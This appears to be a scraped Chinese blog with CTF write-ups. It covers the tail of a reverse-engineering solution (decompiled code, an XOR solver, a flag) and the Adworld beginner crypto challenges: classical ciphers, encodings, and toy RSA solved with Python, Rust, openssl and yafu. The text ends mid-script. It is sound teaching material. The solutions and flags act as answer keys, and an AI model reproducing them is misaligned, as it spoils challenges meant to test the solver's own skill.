*(v118 - 1) = v125 - v124 + 1; continue; } break; } ++v118; v123 = 1;LABEL_333: if ( v118[2] ) v118[2] = 0; if ( v118[3] ) { v126 = *(v118 - 78); v118[3] = 0; if ( v126 ) goto LABEL_337;LABEL_450: v126 = 0; } else { v126 = *(v118 - 78); if ( !v126 ) goto LABEL_450;LABEL_337: *(v118 - 78) = v126; *v118 = v126; *((_WORD *)v118 + 1) = 0; } v127 = v118 + 1; if ( !v123 ) goto LABEL_342; while ( 2 ) { if ( v126 ) { v128 = *v127; v126 += *(v127 - 2); *(v127 - 1) = 0; *(v127 - 2) = v126; v129 = v128 - 1; *v127 = v128 - 1; if ( v128 == 1 ) break; goto LABEL_341; } v128 = *v127; v126 = *(v127 - 2); v129 = *v127 - 1; *v127 = v129; if ( v128 != 1 ) {LABEL_341: *--v127 = v128 - 1; v127[1] = v129 - v128 + 1; continue; } break; } --v127;LABEL_342: if ( v127[5] ) v127[5] = 0; if ( v127[7] ) v127[7] = 0; if ( v127[6] ) v127[6] = 0; v130 = v127[3]; v131 = *(v127 - 2); v132 = 0; v133 = 0; v134 = -8; while ( 2 ) { v135 = v134 + 8; if ( v127[4] ) v127[4] = 0; if ( v130 ) v127[3] = 0; if ( v127[2] ) v127[2] = 0; if ( v127[1] ) v127[1] = 0; v136 = v131; if ( v131 ) { v131 = 0; v137 = 2; do { while ( 1 ) { v138 = v137; --v136; v137 = (unsigned __int8)v127[1]; if ( (_BYTE)v138 == 1 ) { v139 = -1; } else { v137 = v138 + v137 - 1; v139 = v138 - 2; v127[1] = v137; } if ( (_BYTE)v137 ) v127[1] = 0; ++v132; if ( !(_BYTE)v139 ) break; v131 -= v139; v140 = ~v139; v137 += 2 * v140 + 2; v127[2] = v131; v132 = v132 - 2 * v140 - 2; if ( !v136 ) goto LABEL_365; } } while ( v136 );LABEL_365: v127[3] = 0; v127[5] = v132; *(v127 - 2) = 0; if ( v131 ) { *(v127 - 2) = v131; v127[2] = 0; } } v141 = 0; if ( !v126 ) { LOBYTE(v143) = 2; if ( (_BYTE)v132 ) goto LABEL_380;LABEL_441: if ( (_BYTE)v134 != 0xF8 ) goto LABEL_381; v134 = -7;LABEL_388: v132 = (unsigned __int8)v127[5]; v126 = v141; v130 = 0; continue; } break; } v142 = 0; v143 = 2; do { while ( 1 ) { v144 = v143; --v126; v143 = (unsigned __int8)v127[1]; if ( (_BYTE)v144 == 1 ) { v145 = -1; } else { v143 = v144 + v143 - 1; v145 = v144 - 2; v127[1] = v143; } if ( (_BYTE)v143 ) v127[1] = 0; ++v142; if ( !(_BYTE)v145 ) break; v141 -= v145; v142 += 2 * v145; v127[2] = v141; v143 += 2 * ~v145 + 2; if ( !v126 ) goto LABEL_375; } } while ( v126 );LABEL_375: v127[3] = 0; v127[4] = v142; *(v127 - 1) = 0; if ( v141 ) { v127[2] = 0; *(v127 - 1) = v141; } if ( (_BYTE)v142 ) { v132 -= v142; v127[4] = 0; v127[5] = v132; } if ( !(_BYTE)v132 ) goto LABEL_441;LABEL_380: v127[5] = 0; v132 = 1; v127[3] = 1; if ( (_BYTE)v134 == 0xF8 ) { ++v133; v127[3] = 0; v134 = -7; v127[7] = v133; goto LABEL_388; }LABEL_381: v127[4] = v135; v146 = (unsigned __int8)v127[2]; v127[5] = 0; while ( 1 ) { if ( (_BYTE)v132 ) { v146 += v132; *((_WORD *)v127 + 1) = (unsigned __int8)v146; } if ( !(_BYTE)v146 ) break; v132 = 2 * v146; v127[2] = 0; v146 = 0; v127[3] = v132; LOBYTE(v135) = v135 - 1; if ( !(_BYTE)v135 ) goto LABEL_386; } do { LOBYTE(v135) = v135 - 1; v132 = v135; } while ( (_BYTE)v135 );LABEL_386: v127[4] = 0; if ( (_BYTE)v132 ) { v133 += v132; v127[3] = 0; v127[7] = v133; LOBYTE(v134) = v134 + 1; if ( !(_BYTE)v134 ) goto LABEL_392; goto LABEL_388; } LOBYTE(v134) = v134 + 1; if ( (_BYTE)v134 ) goto LABEL_388;LABEL_392: *v127 = v143; v127[6] = 0; if ( (_BYTE)v133 ) { v131 += v133; v127[7] = 0; *(v127 - 2) = v131; } v147 = v127 - 4; if ( *(v127 - 4) ) { while ( 1 ) { if ( v141 ) v147[3] = 0; if ( v131 ) { v147[2] = 0; v147[3] = v131; } v148 = *++v147; v159 = v148 + 1; *v147 = v148 + 1; v158 = v148 + 1; if ( v148 != -1 ) { *v147 = 0; v147[1] = v159; } v149 = *(v147 - 1) - 1; *(v147 - 1) = v149; if ( !v149 ) break; *v147 = v149; v141 = v147[3]; *(v147 - 1) = 0; } v141 = v147[3]; } else { v158 = *(v127 - 3); v159 = v158; } if ( v141 ) v147[3] = 0; if ( *(v147 - 75) ) *(v147 - 75) = 0; if ( v131 ) { *(v147 - 75) = v131; *v147 = v131; *((_WORD *)v147 + 1) = 0; } v150 = v147 + 1; if ( v158 ) { while ( 1 ) { if ( v131 ) { v151 = *v150; v131 += *(v150 - 2); *(v150 - 1) = 0; *(v150 - 2) = v131; v152 = v151 - 1; *v150 = v151 - 1; if ( v151 == 1 ) goto LABEL_417; } else { v153 = *v150; v131 = *(v150 - 2); v152 = *v150 - 1; *v150 = v152; if ( v153 == 1 ) {LABEL_417: --v150; v159 = 0; break; } } *--v150 = v152; v150[1] = 0; } } if ( v131 ) *(v150 - 1) = 0; v154 = *(v150 - 38); if ( v154 ) { v155 = v154 + 1; *(v150 - 1) = v154; *(v150 - 38) = 0; *v150 = v154 + 1; if ( v154 == -1 ) { *(v150 - 1) = 0; v112 = 0; } else { *v150 = 0; *(v150 - 38) = v155; *(v150 - 1) = 0;LABEL_423: *(v150 - 1) = v155; *(v150 - 38) = 0; if ( v155 ) { *(v150 - 38) = v155; v112 = v155; } else { v112 = 0; } } } else { v155 = v159 + 1; *v150 = v159 + 1; if ( v159 != -1 ) goto LABEL_423; v112 = 0; } v4 = v150[2] == 0; *(_WORD *)v150 = 36; if ( !v4 ) v150[2] = 0; v156 = 36; do { if ( v155 ) {LABEL_429: *(v150 - 1) = 0; v150[2] = v155; *(v150 - 1) = v155; v157 = v155; } else { v157 = 0; } if ( !v157 ) { while ( --v156 ) { if ( v155 ) goto LABEL_429; } *(_WORD *)v150 = 256; v72 = v150 - 1; *v72 = 1; v72[2] = 0; goto LABEL_309; } --v155; v150[2] = 0; *(v150 - 1) = v155; --v156; } while ( v156 ); *(_WORD *)v150 = 0; if ( v155 ) *(v150 - 1) = 0; v72 = v150 - 1; if ( v112 ) goto LABEL_168;LABEL_169: v72[2] = 0; *(_WORD *)v72 = 1;LABEL_170: v75 = *(v72 - 37); *v72 = 5; if ( v75 ) { v76 = v75 + 5; *v72 = v76; *(_WORD *)(v72 + 1) = 0; if ( !v76 ) goto LABEL_178; } v77 = v72; v76 = 0; while ( 2 ) { v72[2] = 1; if ( v76 ) { v78 = *v72; ++v76; v72[1] = 0; v72[2] = v76; v79 = v78 - 1; *v72 = v78 - 1; if ( v78 == 1 ) { ++v72; goto LABEL_176; } goto LABEL_175; } v78 = *v72; v79 = *v72 - 1; *v72 = v79; if ( v78 != 1 ) { v76 = 1;LABEL_175: *++v72 = v78 - 1; *(v72 - 1) = v79 - v78 + 1; v77 = v72; continue; } break; } ++v72; v76 = 1;LABEL_176: if ( v77[3] ) v72[2] = 0;LABEL_178: if ( v72[3] ) { v80 = *(v72 - 75); v72[3] = 0; if ( v80 ) goto LABEL_180; } else { v80 = *(v72 - 75); if ( v80 ) {LABEL_180: *v72 += v80; *(v72 - 75) = v80; *((_WORD *)v72 + 1) = 0; } } v81 = v72 + 1; if ( v76 ) { while ( 1 ) { v82 = *(v81 - 1); if ( v82 ) { *(v81 - 2) += v82; *(v81 - 1) = 0; } v83 = *v81; v84 = *v81 - 1; *v81 = v84; if ( v83 == 1 ) break; *--v81 = v83 - 1; v81[1] = v84 - v83 + 1; } --v81; } if ( v81[1] ) { v85 = *(v81 - 38); v81[1] = 0; if ( v85 ) goto LABEL_188;LABEL_264: v86 = 0; goto LABEL_193; } v85 = *(v81 - 38); if ( !v85 ) goto LABEL_264;LABEL_188: *v81 = v85; v86 = 0; *(v81 - 38) = v85; v81[1] = 0; while ( 2 ) { v81[2] = 1; if ( v86 ) { v87 = *v81; ++v86; v81[1] = 0; v81[2] = v86; v88 = v87 - 1; *v81 = v87 - 1; if ( v87 == 1 ) { ++v81; goto LABEL_193; } goto LABEL_189; } v87 = *v81; v88 = *v81 - 1; *v81 = v88; if ( v87 != 1 ) { v86 = 1;LABEL_189: *++v81 = v87 - 1; *(v81 - 1) = v88 - v87 + 1; continue; } break; } ++v81; v86 = 1;LABEL_193: if ( v81[2] ) v81[2] = 0; if ( v81[3] ) { v89 = *(v81 - 33); v81[3] = 0; if ( v89 ) goto LABEL_197;LABEL_276: v89 = 0; } else { v89 = *(v81 - 33); if ( !v89 ) goto LABEL_276;LABEL_197: *(v81 - 33) = v89; *v81 = v89; *((_WORD *)v81 + 1) = 0; } v90 = v81 + 1; if ( !v86 ) goto LABEL_202; while ( 2 ) { if ( v89 ) { v91 = *v90; v89 += *(v90 - 2); *(v90 - 1) = 0; *(v90 - 2) = v89; v92 = v91 - 1; *v90 = v91 - 1; if ( v91 == 1 ) break; goto LABEL_201; } v91 = *v90; v89 = *(v90 - 2); v92 = *v90 - 1; *v90 = v92; if ( v91 != 1 ) {LABEL_201: *--v90 = v91 - 1; v90[1] = v92 - v91 + 1; continue; } break; } --v90;LABEL_202: v93 = *(v90 - 2); v72 = v90 - 2; if ( v93 ) { v94 = v89 - v93; *(v90 - 2) = 0; *(v90 - 1) = v94; if ( v94 ) goto LABEL_204; } else if ( v89 ) {LABEL_204: v4 = v90[1] == 0; *(v90 - 1) = 0; if ( !v4 ) v90[1] = 0; if ( *(v90 - 38) ) *(v90 - 38) = 0; } v95 = *(v90 - 39); if ( v95 ) { v96 = v95 + 1; *(v90 - 39) = 0; *(v90 - 1) = v96; if ( v96 ) goto LABEL_210; *(v90 - 2) = 0; } else { v96 = 1;LABEL_210: *(v90 - 2) = v96; *(v90 - 39) = v96; } v4 = v90[1] == 0; *v90 = 0; *(v90 - 1) = 32; if ( !v4 ) v90[1] = 0; v97 = 32; do { if ( !v96 ) { do --v97; while ( v97 ); *v90 = 1; *(v90 - 1) = 0; *(v90 - 2) = 1; *v90 = 0; goto LABEL_170; } *(v90 - 2) = 0; v90[1] = v96; *(v90 - 2) = v96--; v90[1] = 0; *(v90 - 2) = v96; --v97; } while ( v97 ); *v90 = 0; *(v90 - 1) = 0; if ( v96 ) *(v90 - 2) = 0; v98 = *(v90 - 38); v99 = *(v90 - 2); if ( v98 ) { v99 += v98; *(v90 - 2) = v99; } if ( v99 ) { *(v90 - 1) = 0; putc('C', _bss_start); putc('o', _bss_start); putc('n', _bss_start); putc('g', _bss_start); putc('r', _bss_start); putc('a', _bss_start); putc('t', _bss_start); putc('s', _bss_start); v100 = _bss_start; *(_WORD *)v90 = 33; putc('!', v100); *(v90 - 2) = 0; } else { *(v90 - 1) = 1; do { putc('n', _bss_start); putc('o', _bss_start); putc('n', _bss_start); putc('o', _bss_start); putc('n', _bss_start); *(_WORD *)v90 = 'o'; putc('o', _bss_start); v4 = (*(v90 - 1))-- == 1; } while ( !v4 ); } v4 = (*(v90 - 35))-- == 1; v62 = v90 - 35; if ( !v4 ) continue; return 0; }} 虽然还有较多的无用代码，但是已经可以看到程序的大致流程，输入之后判断是否为flag{***}格式，然后进行正确性检验，和已知数据进行对比，正确输出Congrats!，错误输出nonono。 程序逻辑通过调试其实可以发现程序的主要执行逻辑就是与后一位异或，代码中的体现就是两数不停除2，找到每一位的数为1或是0，如两数第n位相同则结果不变，体现到二进制上就是最终结果的第n位为0，不同则结果加2^n，体现到二进制上就是最终结果的第n位为1 知道算法是异或之后很容易解出来flag 123456789target = [0x53, 0x0F, 0x5A, 0x54, 0x50, 0x55, 0x03, 0x02, 0x00, 0x07, 0x56, 0x07, 0x07, 0x5B, 0x09, 0x00, 0x50, 0x05, 0x02, 0x03, 0x5D, 0x5C, 0x50, 0x51, 0x52, 0x54, 0x5A, 0x5F, 0x02, 0x57, 0x07, 0x34]for i in range(len(target)-1, 0, -1): target[i-1] ^= target[i]flag = 'flag{'+\"\".join([chr(i) for i in target])+'}'print(flag)# flag{d78b6f30225cdc811adfe8d4e7c9fd34} babyruby 当时硬逆了很久mruby的字节码，只有AAA唯一解，有时间复现一下 Mobilecapp 抽空复现 uniapp 抽空复现","link":"/2021/10/05/wp-5space-2021/"},{"title":"攻防世界_Crypto_wp","text":"开始学Crypto主要有两个原因，第一还是受了最近两场比赛的影响，安恒月赛的时候真就提前ak了re之后看着掉排名，GKCTF也是只上了单榜；第二就是最近做re的时候，经常会做到最后遇到加密算法还是抓瞎，所以开始接触了密码学的东西，拿Crypto练习练习 新手区base64密文 1Y3liZXJwZWFjZXtXZWxjb21lX3RvX25ld19Xb3JsZCF9 直接base64解一下就出来了 1cyberpeace{Welcome_to_new_World!} Caeser密文 1oknqdbqmoq{kag_tmhq_xqmdzqp_omqemd_qzodkbfuaz} 凯撒密码，正好用到之前信安导论的大作业，Rust is the future! 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061#![allow(dead_code)]#![allow(unused)]fn encrypt(s: &amp;str,rot: u8) -&gt; String{ let mut s_ret=String::new(); for c in s.chars(){ if ('a' as u8) &lt;= c as u8 &amp;&amp; (c as u8) &lt;= 'z' as u8 { let mut tmp =(c as u8) -('a' as u8); tmp=(26+tmp+rot)%26+'a' as u8; let ch=tmp as char; s_ret.push(ch); } else if ('A' as u8) &lt;= (c as u8) &amp;&amp; (c as u8) &lt;= ('Z' as u8) { let mut tmp =(c as u8)-('A' as u8); tmp=(26+tmp+rot)%26+'A' as u8; let ch=tmp as char; s_ret.push(ch); } else { s_ret.push(c); continue; } } s_ret}fn decrypt(s: &amp;str,rot: u8) -&gt; String{ let mut s_ret=String::new(); for c in s.chars(){ if ('a' as u8) &lt;= (c as u8) &amp;&amp; (c as u8) &lt;= ('z' as u8) { let mut tmp =(c as u8) -('a' as u8); tmp=(26+tmp-rot)%26+'a' as u8; // plus 26 to avoid 'attempt to subtract with overflow' error since u8 is unsigned let ch=tmp as char; s_ret.push(ch); } else if ('A' as u8) &lt;= (c as u8) &amp;&amp; (c as u8) &lt;= ('Z' as u8) { let mut tmp =(c as u8)-('A' as u8); tmp=(26+tmp-rot)%26+'A' as u8; // plus 26 to avoid 'attempt to subtract with overflow' error since u8 is unsigned let ch=tmp as char; s_ret.push(ch); } else { s_ret.push(c); continue; } } s_ret}fn main() { let s=decrypt(\"oknqdbqmoq{kag_tmhq_xqmdzqp_omqemd_qzodkbfuaz}\",12); println!(\"{:?}\",s);} 得到flag 1cyberpeace{you_have_learned_caesar_encryption} Morse题目是摩斯密码但是内容全是0和1，所以应该是0对应.，1对应- 1234567891011121314151617181920212223242526272829303132333435363738394041CODE = {'A': '.-', 'B': '-...', 'C': '-.-.', 'D': '-..', 'E': '.', 'F': '..-.', 'G': '--.', 'H': '....', 'I': '..', 'J': '.---', 'K': '-.-', 'L': '.-..', 'M': '--', 'N': '-.', 'O': '---', 'P': '.--.', 'Q': '--.-', 'R': '.-.', 'S': '...', 'T': '-', 'U': '..-', 'V': '...-', 'W': '.--', 'X': '-..-', 'Y': '-.--', 'Z': '--..', '0': '-----', '1': '.----', '2': '..---', '3': '...--', '4': '....-', '5': '.....', '6': '-....', '7': '--...', '8': '---..', '9': '----.', '.': '.-.-.-', ':': '---...', ',': '--..--', ';': '-.-.-.', '?': '..--..', '=': '-...-', '\\'': '.----.', '/': '-..-.', '!': '-.-.--', '-': '-....-', '_': '..--.-', '\"': '.-..-.', '(': '-.--.', ')': '-.--.-', '$': '...-..-', '&amp;': '.-...', '@': '.--.-.' }def Decode(str): Decode_value = CODE.keys() Decode_key = CODE.values() Decode_dict = dict(zip(Decode_key, Decode_value)) text ='' str=str.replace('0','.') str=str.replace('1','-') # print(str) msg=str.split(' ') for s in msg: if s in Decode_dict.keys(): text+=Decode_dict[s] return textstr='11 111 010 000 0 1010 111 100 0 00 000 000 111 00 10 1 0 010 0 000 1 00 10 110'print(Decode(str).lower()) 得到flag 1morsecodeissointeresting 混合编码密文 1JiM3NjsmIzEyMjsmIzY5OyYjMTIwOyYjNzk7JiM4MzsmIzU2OyYjMTIwOyYjNzc7JiM2ODsmIzY5OyYjMTE4OyYjNzc7JiM4NDsmIzY1OyYjNTI7JiM3NjsmIzEyMjsmIzEwNzsmIzUzOyYjNzY7JiMxMjI7JiM2OTsmIzEyMDsmIzc3OyYjODM7JiM1NjsmIzEyMDsmIzc3OyYjNjg7JiMxMDc7JiMxMTg7JiM3NzsmIzg0OyYjNjU7JiMxMjA7JiM3NjsmIzEyMjsmIzY5OyYjMTIwOyYjNzg7JiMxMDU7JiM1NjsmIzEyMDsmIzc3OyYjODQ7JiM2OTsmIzExODsmIzc5OyYjODQ7JiM5OTsmIzExODsmIzc3OyYjODQ7JiM2OTsmIzUwOyYjNzY7JiMxMjI7JiM2OTsmIzEyMDsmIzc4OyYjMTA1OyYjNTY7JiM1MzsmIzc4OyYjMTIxOyYjNTY7JiM1MzsmIzc5OyYjODM7JiM1NjsmIzEyMDsmIzc3OyYjNjg7JiM5OTsmIzExODsmIzc5OyYjODQ7JiM5OTsmIzExODsmIzc3OyYjODQ7JiM2OTsmIzExOTsmIzc2OyYjMTIyOyYjNjk7JiMxMTk7JiM3NzsmIzY3OyYjNTY7JiMxMjA7JiM3NzsmIzY4OyYjNjU7JiMxMTg7JiM3NzsmIzg0OyYjNjU7JiMxMjA7JiM3NjsmIzEyMjsmIzY5OyYjMTE5OyYjNzc7JiMxMDU7JiM1NjsmIzEyMDsmIzc3OyYjNjg7JiM2OTsmIzExODsmIzc3OyYjODQ7JiM2OTsmIzExOTsmIzc2OyYjMTIyOyYjMTA3OyYjNTM7JiM3NjsmIzEyMjsmIzY5OyYjMTE5OyYjNzc7JiM4MzsmIzU2OyYjMTIwOyYjNzc7JiM4NDsmIzEwNzsmIzExODsmIzc3OyYjODQ7JiM2OTsmIzEyMDsmIzc2OyYjMTIyOyYjNjk7JiMxMjA7JiM3ODsmIzY3OyYjNTY7JiMxMjA7JiM3NzsmIzY4OyYjMTAzOyYjMTE4OyYjNzc7JiM4NDsmIzY1OyYjMTE5Ow== base64解一下 1&amp;#76;&amp;#122;&amp;#69;&amp;#120;&amp;#79;&amp;#83;&amp;#56;&amp;#120;&amp;#77;&amp;#68;&amp;#69;&amp;#118;&amp;#77;&amp;#84;&amp;#65;&amp;#52;&amp;#76;&amp;#122;&amp;#107;&amp;#53;&amp;#76;&amp;#122;&amp;#69;&amp;#120;&amp;#77;&amp;#83;&amp;#56;&amp;#120;&amp;#77;&amp;#68;&amp;#107;&amp;#118;&amp;#77;&amp;#84;&amp;#65;&amp;#120;&amp;#76;&amp;#122;&amp;#69;&amp;#120;&amp;#78;&amp;#105;&amp;#56;&amp;#120;&amp;#77;&amp;#84;&amp;#69;&amp;#118;&amp;#79;&amp;#84;&amp;#99;&amp;#118;&amp;#77;&amp;#84;&amp;#69;&amp;#50;&amp;#76;&amp;#122;&amp;#69;&amp;#120;&amp;#78;&amp;#105;&amp;#56;&amp;#53;&amp;#78;&amp;#121;&amp;#56;&amp;#53;&amp;#79;&amp;#83;&amp;#56;&amp;#120;&amp;#77;&amp;#68;&amp;#99;&amp;#118;&amp;#79;&amp;#84;&amp;#99;&amp;#118;&amp;#77;&amp;#84;&amp;#69;&amp;#119;&amp;#76;&amp;#122;&amp;#69;&amp;#119;&amp;#77;&amp;#67;&amp;#56;&amp;#120;&amp;#77;&amp;#68;&amp;#65;&amp;#118;&amp;#77;&amp;#84;&amp;#65;&amp;#120;&amp;#76;&amp;#122;&amp;#69;&amp;#119;&amp;#77;&amp;#105;&amp;#56;&amp;#120;&amp;#77;&amp;#68;&amp;#69;&amp;#118;&amp;#77;&amp;#84;&amp;#69;&amp;#119;&amp;#76;&amp;#122;&amp;#107;&amp;#53;&amp;#76;&amp;#122;&amp;#69;&amp;#119;&amp;#77;&amp;#83;&amp;#56;&amp;#120;&amp;#77;&amp;#84;&amp;#107;&amp;#118;&amp;#77;&amp;#84;&amp;#69;&amp;#120;&amp;#76;&amp;#122;&amp;#69;&amp;#120;&amp;#78;&amp;#67;&amp;#56;&amp;#120;&amp;#77;&amp;#68;&amp;#103;&amp;#118;&amp;#77;&amp;#84;&amp;#65;&amp;#119; Unicode码，新建一个html写进去，浏览器打开得到 1LzExOS8xMDEvMTA4Lzk5LzExMS8xMDkvMTAxLzExNi8xMTEvOTcvMTE2LzExNi85Ny85OS8xMDcvOTcvMTEwLzEwMC8xMDAvMTAxLzEwMi8xMDEvMTEwLzk5LzEwMS8xMTkvMTExLzExNC8xMDgvMTAw 接着base64 1/119/101/108/99/111/109/101/116/111/97/116/116/97/99/107/97/110/100/100/101/102/101/110/99/101/119/111/114/108/100 应该是ASCII码，写脚本跑一波 123456import base64str=b\"LzExOS8xMDEvMTA4Lzk5LzExMS8xMDkvMTAxLzExNi8xMTEvOTcvMTE2LzExNi85Ny85OS8xMDcvOTcvMTEwLzEwMC8xMDAvMTAxLzEwMi8xMDEvMTEwLzk5LzEwMS8xMTkvMTExLzExNC8xMDgvMTAw\"t=base64.b64decode(str).decode().split('/')[1:]# print(t)flag=\"\".join([chr(int(i)) for i in t])print(flag) 得到flag 1welcometoattackanddefenceworld 幂数加密拿到密文 18842101220480224404014224202480122 一串数字，题目提示8个字，看到7个0，猜测0是分隔符，了解以下幂数加密，把每一位加起来得到索引 1WELLDOWN Railfence题目提示栅栏密码，key是5，但是解出来发现不对，报读之后才知道还有一种w模式的栅栏密码，网上找了段代码 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859def enc(plain, num): matrix = [([0] * len(plain)) for i in range(num)] i_s = [] for a in range(num): i_s.append(a) for a in range(num - 2, 0, -1): i_s.append(a) i_s_len = len(i_s) i = 0 for c in plain: matrix[i_s[i % i_s_len]][i] = c i += 1 encrypted = '' for i in range(num): for j in range(len(plain)): if matrix[i][j]: encrypted += matrix[i][j] return encrypteddef dec(encrypted, num): matrix = [([0] * len(encrypted)) for i in range(num)] cur = 0 for i in range(num): if i == 0: pair = [(num - (i + 1)) * 2 - 1] elif i == num - 1: pair = [i * 2 - 1] else: pair = [(num - (i + 1)) * 2 - 1, i * 2 - 1] pair_i = 0 j = i while True: if cur &lt; len(encrypted): matrix[i][j] = encrypted[cur] cur += 1 j += pair[pair_i % len(pair)] + 1 pair_i += 1 if j &gt;= len(encrypted): break i_s = [] for a in range(num): i_s.append(a) for a in range(num - 2, 0, -1): i_s.append(a) i_s_len = len(i_s) decrypted = '' for j in range(len(encrypted)): decrypted += matrix[i_s[j % i_s_len]][j] return decryptedencrypted = 'ccehgyaefnpeoobe{lcirg}epriec_ora_g'num = 5print(dec(encrypted, num)) 得到flag 1cyberpeace{railfence_cipher_gogogo} easy_RSA题目描述非常直接 12在一次RSA密钥对生成中，假设p=473398607161，q=4511491，e=17求解出d 甚至不用求解rsa，找到d就可以了 123456789101112131415161718192021def gcdext(a, b): \"\"\" a: 模的取值 b: 想求逆的值 \"\"\" if b == 0: return 1, 0, a x, y, gcd = gcdext(b, a % b) return y, x - a // b * y, gcdc = 169169912654178p = 473398607161q = 4511491e = 17n = p * q# print(k)fai = (p - 1) * (q - 1)(d, k, g) = gcdext(e, fai)print(d)# 125631357777427553 不仅仅是Morse拿到一段摩斯密码，解一下 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374CODE = { 'A': '.-', 'B': '-...', 'C': '-.-.', 'D': '-..', 'E': '.', 'F': '..-.', 'G': '--.', 'H': '....', 'I': '..', 'J': '.---', 'K': '-.-', 'L': '.-..', 'M': '--', 'N': '-.', 'O': '---', 'P': '.--.', 'Q': '--.-', 'R': '.-.', 'S': '...', 'T': '-', 'U': '..-', 'V': '...-', 'W': '.--', 'X': '-..-', 'Y': '-.--', 'Z': '--..', '0': '-----', '1': '.----', '2': '..---', '3': '...--', '4': '....-', '5': '.....', '6': '-....', '7': '--...', '8': '---..', '9': '----.', '.': '.-.-.-', ':': '---...', ',': '--..--', ';': '-.-.-.', '?': '..--..', '=': '-...-', '\\'': '.----.', '/': '-..-.', '!': '-.-.--', '-': '-....-', '_': '..--.-', '\"': '.-..-.', '(': '-.--.', ')': '-.--.-', '$': '...-..-', '&amp;': '.-...', '@': '.--.-.'}def Decode(str): Decode_value = CODE.keys() Decode_key = CODE.values() Decode_dict = dict(zip(Decode_key, Decode_value)) text = '' # print(str) msg = str.split('/') for s in msg: if s in Decode_dict.keys(): text += Decode_dict[s] return textstr = '--/.-/-.--/..--.-/-..././..--.-/..../.-/...-/./..--.-/.-/-./---/-/...././.-./..--.-/-.././-.-./---/-.././..../..../..../..../.-/.-/.-/.-/.-/-.../.-/.-/-.../-.../-.../.-/.-/-.../-.../.-/.-/.-/.-/.-/.-/.-/.-/-.../.-/.-/-.../.-/-.../.-/.-/.-/.-/.-/.-/.-/-.../-.../.-/-.../.-/.-/.-/-.../-.../.-/.-/.-/-.../-.../.-/.-/-.../.-/.-/.-/.-/-.../.-/-.../.-/.-/-.../.-/.-/.-/-.../-.../.-/-.../.-/.-/.-/-.../.-/.-/.-/-.../.-/.-/-.../.-/-.../-.../.-/.-/-.../-.../-.../.-/-.../.-/.-/.-/-.../.-/-.../.-/-.../-.../.-/.-/.-/-.../-.../.-/-.../.-/.-/.-/-.../.-/.-/-.../.-/.-/-.../.-/.-/.-/.-/-.../-.../.-/-.../-.../.-/.-/-.../-.../.-/.-/-.../.-/.-/-.../.-/.-/.-/-.../.-/.-/-.../.-/.-/-.../.-/.-/-.../.-/-.../.-/.-/-.../-.../.-/-.../.-/.-/.-/.-/-.../-.../.-/-.../.-/.-/-.../-.../.-'print(Decode(str).lower())# may_be_have_another_decodehhhhaaaaabaabbbaabbaaaaaaaabaababaaaaaaabbabaaabbaaabbaabaaaababaabaaabbabaaabaaabaababbaabbbabaaabababbaaabbabaaabaabaabaaaabbabbaabbaabaabaaabaabaabaababaabbabaaaabbabaabba 这一段ab组成的密文是培根密码，写脚本解一下培根密码 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849import res = 'aaaaabaabbbaabbaaaaaaaabaababaaaaaaabbabaaabbaaabbaabaaaababaabaaabbabaaabaaabaababbaabbbabaaabababbaaabbabaaabaabaabaaaabbabbaabbaabaabaaabaabaabaababaabbabaaaabbabaabba'CODE_TABLE = { 'a': 'aaaaa', 'b': 'aaaab', 'c': 'aaaba', 'd': 'aaabb', 'e': 'aabaa', 'f': 'aabab', 'g': 'aabba', 'h': 'aabbb', 'i': 'abaaa', 'j': 'abaab', 'k': 'ababa', 'l': 'ababb', 'm': 'abbaa', 'n': 'abbab', 'o': 'abbba', 'p': 'abbbb', 'q': 'baaaa', 'r': 'baaab', 's': 'baaba', 't': 'baabb', 'u': 'babaa', 'v': 'babab', 'w': 'babba', 'x': 'babbb', 'y': 'bbaaa', 'z': 'bbaab'}def bacondecode(bacon): msg = '' codes = re.findall(r'.{5}', bacon) for code in codes: if code == '': msg += ' ' else: UNCODE = dict(map(lambda t: (t[1], t[0]), CODE_TABLE.items())) msg += UNCODE[code] return msgflag = bacondecode(s)print('flag is ', flag)# flag is attackanddefenceworldisinteresting easychallengere和crypto一家石锤 pyc没做任何修改，直接uncompyle6反编译，得到结果改一下算法逆向计算一下得到结果 12345678910111213141516171819202122232425262728293031import base64def encode1(ans): s = '' for i in ans: x = ord(i) - 25 x = x ^ 36 s += chr(x) return sdef encode2(ans): s = '' for i in ans: x = i ^ 36 x = x - 36 s += chr(x) return sdef encode3(ans): return base64.b32decode(ans)flag = ' 'final = 'UC7KOWVXWVNKNIC2XCXKHKK2W5NLBKNOUOSK3LNNVWW3E==='print(encode1(encode2(encode3(final))))# cyberpeace{interestinghhhhh} Normal_RSA这题算是进入了基本的crypto领域了 首先作为一个脚本小子，直接拿别人的工具就可以跑出结果 CTF-RSA-tool很不错，虽然里面大部分的解法目前我还都不会 正常解法 首先用openssl解析一下公钥 12345678910111213-&gt; openssl rsa -pubin -text -modulus -in pubkey.pemRSA Public-Key: (256 bit)Modulus: 00:c2:63:6a:e5:c3:d8:e4:3f:fb:97:ab:09:02:8f: 1a:ac:6c:0b:f6:cd:3d:70:eb:ca:28:1b:ff:e9:7f: be:30:ddExponent: 65537 (0x10001)Modulus=C2636AE5C3D8E43FFB97AB09028F1AAC6C0BF6CD3D70EBCA281BFFE97FBE30DDwriting RSA key-----BEGIN PUBLIC KEY-----MDwwDQYJKoZIhvcNAQEBBQADKwAwKAIhAMJjauXD2OQ/+5erCQKPGqxsC/bNPXDryigb/+l/vjDdAgMBAAE=-----END PUBLIC KEY----- 得到了n=0xC2636AE5C3D8E43FFB97AB09028F1AAC6C0BF6CD3D70EBCA281BFFE97FBE30DD，e=65537，这个n不是很大，所以yafu直接分解，很快得到p和q 12P39 = 319576316814478949870590164193048041239P39 = 275127860351348928173285174381581152299 然后正常rsa的套路跑一边很快就可以得到结果 123456789101112131415161718192021222324252627282930313233343536373839404142import gmpy2def bytes2num(b): s = '0x' for x in b: tmp = str(hex(x))[2:] if len(tmp) == 2: pass else: tmp = '0' + tmp #print(tmp) s += tmp num = int(s, 16) return numdef num2str(n): tmp = str(hex(n))[2:] if len(tmp) % 2 == 0: pass else: tmp = '0' + tmp s = '' for i in range(0, len(tmp), 2): temp = tmp[i] + tmp[i + 1] s += chr(int(temp, 16)) return sr = open(\"flag.enc\", \"rb\")r = r.read()r = bytes2num(r)e = 65537n = 87924348264132406875276140514499937145050893665602592992418171647042491658461p = 